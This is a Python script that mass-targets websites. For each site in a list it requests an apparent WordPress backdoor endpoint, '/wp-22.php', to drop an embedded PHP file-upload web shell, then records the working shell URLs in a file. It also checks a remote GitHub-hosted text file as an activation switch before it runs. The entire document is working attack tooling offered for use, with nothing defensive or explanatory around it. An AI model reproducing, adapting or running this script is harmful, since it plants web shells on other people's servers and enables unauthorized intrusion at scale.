import os
import requests
import threading
from concurrent.futures import ThreadPoolExecutor
from termcolor import colored



# Set the shell content
shell_content = '''
<?php echo 'https://t.me/DrDataYE<br>';echo '<br>';echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"> </form>';if( $_POST['_upl'] == "Upload" ) {if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload !!!</b><br><br>'; }else { echo '<b>Upload !!!</b><br><br>';}}?>
'''

# Set the banner
banner = colored('''
██████╗ ██████╗ ██████╗ ███████╗ ██████╗ ███╗   ██╗██████╗ 
██╔══██╗╚════██╗██╔══██╗╚══███╔╝██╔═████╗████╗  ██║╚════██╗
██████╔╝ █████╔╝██║  ██║  ███╔╝ ██║██╔██║██╔██╗ ██║ █████╔╝
██╔══██╗ ╚═══██╗██║  ██║ ███╔╝  ████╔╝██║██║╚██╗██║ ╚═══██╗
██║  ██║██████╔╝██████╔╝███████╗╚██████╔╝██║ ╚████║██████╔╝
╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ 
''', 'red')


def bads(url):
    try:
        url = URLdomain(url)
        filename = 'DrDataYE.php'
        response = requests.get(url + f'/wp-22.php?sfilename={filename}&sfilecontent={shell_content}&supfiles={filename}', headers={'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36'})
        if response.status_code == 200 and 'phpsuccess' in (response.text):
            print(f'{colored("[+] ", "green")}- {url + filename} - success')
            with open('Shells.txt', 'a') as ww:
                ww.write(url + filename + '\n')
        print(f'{colored("[-] ", "red")}- {url} - Sad')
        return
    finally:
        pass

def main():
    thread2 = threading.Thread(target=ok)
    thread2.start()
    thread2.join()

def ok():
    sex = 'ok'
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
    if 'ok' in sex:
        check = requests.get('https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/wpscan/main/o.txt', timeout=15).text
        if 'oknopblm' in check:
            try:
                print(banner)
                filename = input('Enter filename containing list of sites: ')
                with open(filename, mode='r') as file:
                    sites = [line.strip() for line in file.readlines()]
                with ThreadPoolExecutor(max_workers=50) as executor:
                    executor.map(bads, sites)
            finally:
                pass
        print('[!] Of This Tools ')
    else:
        print('[!] by by... ')



def URLdomain(site):
    if not site.startswith(('http://', 'https://')):
        if not site.startswith('www.'):
            site = 'http://' + site
        else:
            site = 'http://www.' + site
    if not site.endswith('/'):
        site += '/'
    return site

if __name__ == "__main__":
    bot = main()
